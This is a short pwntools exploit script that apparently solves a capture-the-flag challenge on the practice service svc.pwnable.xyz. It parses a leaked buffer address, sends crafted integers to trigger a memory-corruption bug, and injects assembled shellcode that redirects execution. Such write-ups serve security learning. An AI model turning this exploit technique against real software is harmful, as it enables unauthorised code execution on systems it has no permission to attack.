from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30028)

p.recvuntil('==')
buf = int(p.recvline().strip(),16)
log.info('buf : ' + str(buf))
p.sendlineafter('>',str(0x80000000+buf) + ' ' + str(0x80000000))

s='''
pop rax
sub ax, 0x2ce
call rax
'''
p.sendafter('Input: ','\x00\x02'+asm(s))

p.interactive()